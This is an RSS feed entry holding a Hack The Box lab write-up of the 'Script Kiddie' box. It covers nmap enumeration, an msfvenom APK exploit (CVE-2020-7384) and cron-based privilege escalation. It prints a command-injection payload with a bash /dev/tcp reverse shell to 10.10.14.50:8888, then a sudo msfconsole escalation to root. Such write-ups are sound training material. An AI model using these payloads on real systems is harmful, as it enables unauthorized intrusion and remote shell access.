@@ -1,0 +1,104 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Sam Docs – Hack The Box Writeups</title><link>/docs/capture-the-flag/hack-the-box/</link><description>Recent content in Hack The Box Writeups on Sam Docs</description><generator>Hugo -- gohugo.io</generator><lastBuildDate>Mon, 06 Mar 2023 00:00:00 +0000</lastBuildDate><atom:link href="/docs/capture-the-flag/hack-the-box/index.xml" rel="self" type="application/rss+xml"/><item><title>Docs: Script Kiddie Writeup</title><link>/docs/capture-the-flag/hack-the-box/script-kiddie/</link><pubDate>Mon, 06 Mar 2023 00:00:00 +0000</pubDate><guid>/docs/capture-the-flag/hack-the-box/script-kiddie/</guid><description>
+&lt;p>&lt;img src="images/1_script_kiddie.png" alt="image">&lt;/p>
+&lt;p>&lt;strong>Script Kiddie!&lt;/strong>&lt;br>
+What is the author (0xdf) implying to us?&lt;/p>
+&lt;p>A box for script kiddies?&lt;br>
+Or is it a box for us to stand out from the script kiddies?&lt;br>
+My guess would be the latter…&lt;/p>
+&lt;p>Keep in mind, the destination (root.txt) is not what’s important, it’s the journey (every line that got us to root.txt) that counts.&lt;/p>
+&lt;p>&lt;strong>With that said, let’s begin!&lt;/strong>&lt;/p>
+&lt;hr>
+&lt;h2 id="enumeration">&lt;strong>Enumeration&lt;/strong>&lt;/h2>
+&lt;p>&lt;img src="images/2_nmap_scan.png" alt="image">&lt;/p>
+&lt;p>Nmap scan reveals &lt;code>Werkzeug httpd 0.16.1 (Python 3.8.5)&lt;/code> running on port 5000.&lt;/p>
+&lt;hr>
+&lt;p>&lt;img src="images/3_visit_site.png" alt="image">&lt;/p>
+&lt;p>Quite a few options are available to play with… Nmap, Msfvenom, Searchsploit…&lt;/p>
+&lt;hr>
+&lt;p>&lt;img src="images/4_werkzeug_metasploit.png" alt="image">&lt;/p>
+&lt;p>The Werkzeug module available from Metasploit will spawn a Python shell, provided if we had access to a &lt;strong>Werkzeug debug console&lt;/strong>. But since we don’t, this exploit is unusable for us.&lt;/p>
+&lt;hr>
+&lt;h2 id="exploitation">&lt;strong>Exploitation&lt;/strong>&lt;/h2>
+&lt;p>&lt;img src="images/5_venom_metasploit.png" alt="image">&lt;/p>
+&lt;p>The exploit we are using is &lt;code>CVE-2020–7384&lt;/code>, one that leverages the mishandling of apk files by Msfvenom to grant us a reverse shell.&lt;/p>
+&lt;p>We&amp;rsquo;ll start by configuring the necessary parameters in Metasploit.&lt;/p>
+&lt;hr>
+&lt;p>&lt;img src="images/6_first_netcat_wait.png" alt="image">&lt;/p>
+&lt;p>Setting up Netcat listener on port 4444.&lt;/p>
+&lt;hr>
+&lt;p>&lt;img src="images/7_upload.png" alt="image">&lt;/p>
+&lt;p>With the &lt;code>os&lt;/code> set as Android, &lt;code>lhost&lt;/code> set as some funny ip, we can proceed to upload the APK.&lt;/p>
+&lt;hr>
+&lt;p>&lt;img src="images/8_first_success.png" alt="image">&lt;/p>
+&lt;p>&lt;em>&lt;strong>Voila!&lt;/strong>&lt;/em> And we’ve got user access to the machine.&lt;/p>
+&lt;hr>
+&lt;h2 id="privilege-escalation">&lt;strong>Privilege Escalation&lt;/strong>&lt;/h2>
+&lt;p>&lt;img src="images/9_scanlosersh.png" alt="image">&lt;/p>
+&lt;p>&lt;code>/home/pwn/scanlosers.sh&lt;/code>&lt;/p>
+&lt;p>&lt;img src="images/10_hackers.png" alt="image">&lt;/p>
+&lt;p>&lt;code>home/kid/logs/hackers&lt;/code>&lt;/p>
+&lt;p>There’s an interesting script &lt;code>scanlosers.sh&lt;/code>, within user directory of &lt;code>pwn&lt;/code>, but we (the &lt;code>kid&lt;/code> user) unfortunately only have read access to it.&lt;/p>
+&lt;p>That said, since it takes in input from the &lt;code>hackers&lt;/code> file, which we is owned by us (&lt;code>kid&lt;/code>). Thus, &lt;code>scanlosers.sh&lt;/code> is still accessible by us in some ways.&lt;/p>
+&lt;hr>
+&lt;p>&lt;img src="images/11_cron_sus.png" alt="image">&lt;/p>
+&lt;p>After writing some random stuff into &lt;code>hackers&lt;/code>, but the file seems to remain empty. It brought up suspicion that a cronjob of &lt;code>scanlosers.sh&lt;/code> was running, as the last line of &lt;code>scanlosers.sh&lt;/code> - &lt;code>echo -n &amp;gt; $log&lt;/code> will clear the &lt;code>hackers&lt;/code> file.&lt;/p>
+&lt;hr>
+&lt;p>&lt;img src="images/12_echo_hello.png" alt="image">&lt;/p>
+&lt;p>First Shell: echoing &lt;code>hello&lt;/code> into &lt;code>hackers&lt;/code>&lt;/p>
+&lt;p>&lt;img src="images/13_cron_gottem.png" alt="image">&lt;/p>
+&lt;p>Second Shell: running &lt;code>pspy64&lt;/code>, catches the cronjob of our payload &lt;code>hello&lt;/code>&lt;/p>
+&lt;p>To confirm our suspicion, we will use &lt;a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64">&lt;strong>pspy&lt;/strong>&lt;/a>, a command line tool designed for snooping on commands run by other users, cron jobs, etc.&lt;/p>
+&lt;p>I have downloaded the 64-bit binary version and used &lt;code>nc&lt;/code> to transfer the binary over to the Script Kiddie machine. (feel free to skip this step or try it out for yourself)&lt;/p>
+&lt;ol>
+&lt;li>Initiate two reverse shells.&lt;/li>
+&lt;li>The first shell runs our test payload &lt;code>hello&lt;/code>&lt;/li>
+&lt;li>The second shell runs the &lt;code>pspy64&lt;/code> binary, and was able to catch the details of the cronjob.&lt;/li>
+&lt;/ol>
+&lt;p>Indeed, we are able to confirm a cronjob was running in the background, meaning that &lt;code>/home/pwn/scanlosers.sh&lt;/code> will be executed for each time &lt;code>/home/kid/log/hackers&lt;/code> is being altered.&lt;/p>
+&lt;hr>
+&lt;p>&lt;img src="images/14_explanation.png" alt="image">&lt;/p>
+&lt;p>Some explanations, our payload is basically a &lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp">&lt;strong>Bash TCP Shell&lt;/strong>&lt;/a>. Description for each &lt;em>gate&lt;/em> from &lt;code>scanlosers.sh&lt;/code> are as following:&lt;/p>
+&lt;ol>
+&lt;li>Remove &lt;code>tuna&lt;/code> and &lt;code>salmon&lt;/code>.&lt;/li>
+&lt;li>Sort our payload if it has more than one line, since we don’t, we’re good.&lt;/li>
+&lt;li>Stores our payload into the &lt;code>ip&lt;/code> variable.&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;p>&lt;img src="images/15_2nd_scanlosers.png" alt="image">&lt;/p>
+&lt;p>When our payload is parsed and executed, they will be run as:&lt;/p>
+&lt;ol>
+&lt;li>&lt;code>sh -c “nmap --top-ports 10 -oN recon/;&lt;/code>&lt;br>
+Doesn&amp;rsquo;t do anything since it is an incomplete nmap command, no ip address is supplied.&lt;/li>
+&lt;li>&lt;code>/bin/bash -c ‘bash -i &amp;gt;&amp;amp;/dev/tcp/10.10.14.50/8888 0&amp;gt;&amp;amp;1’&lt;/code>&lt;br>
+&lt;em>&lt;strong>The Bash TCP Shell we need!&lt;/strong>&lt;/em>&lt;/li>
+&lt;li>&lt;code>#.nmap ${ip} 2&amp;gt;&amp;amp;1 &amp;gt;/dev/null” &amp;amp;...&lt;/code>&lt;br>
+Using the &lt;code>#&lt;/code> to comment out everything else&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;p>&lt;img src="images/16_second_shell.png" alt="image">&lt;/p>
+&lt;p>Setting up Netcat listener on port 8888.&lt;/p>
+&lt;hr>
+&lt;p>&lt;img src="images/17_echo_payload.png" alt="image">&lt;/p>
+&lt;p>&lt;em>&lt;strong>Moment of Truth!&lt;/strong>&lt;/em>&lt;/p>
+&lt;p>Writing our payload into &lt;code>hackers&lt;/code>.&lt;/p>
+&lt;p>&lt;code>echo “tuna salmon ;/bin/bash -c ‘bash -i &amp;gt;&amp;amp;/dev/tcp/10.10.14.50/8888 0&amp;gt;&amp;amp;1’ #” &amp;gt;&amp;gt; hackers&lt;/code>&lt;/p>
+&lt;hr>
+&lt;p>&lt;img src="images/18_got_pwn.png" alt="image">&lt;/p>
+&lt;p>After having logged in as &lt;code>pwn&lt;/code>, with &lt;code>sudo -l&lt;/code> we found out that we are able to run &lt;code>msfconsole&lt;/code> as root without the need of password.&lt;/p>
+&lt;hr>
+&lt;p>&lt;img src="images/19_sudo_meta.png" alt="image">&lt;/p>
+&lt;p>Now let’s run &lt;code>msfconsole&lt;/code> as sudo.&lt;/p>
+&lt;p>&lt;code>sudo /opt/metasploit-framework-6.0.9/msfconsole&lt;/code>&lt;/p>
+&lt;hr>
+&lt;p>&lt;img src="images/20_root_flag.png" alt="image">&lt;/p>
+&lt;p>&lt;em>&lt;strong>Jackpot!&lt;/strong>&lt;/em>&lt;/p>
+&lt;p>And there we have it!&lt;/p>
+&lt;h2 id="afterthoughts">&lt;strong>Afterthoughts&lt;/strong>&lt;/h2>
+&lt;p>Overall, &lt;strong>ScriptKiddie&lt;/strong> teaches the basic yet core concepts of the HTB platform:&lt;/p>
+&lt;ul>
+&lt;li>Metasploit&lt;/li>
+&lt;li>Cronjobs&lt;/li>
+&lt;li>Bash scripting&lt;/li>
+&lt;li>&lt;code>sudo -l&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>It is one box that should definitely be recommend for the newcomers!&lt;/p></description></item></channel></rss>
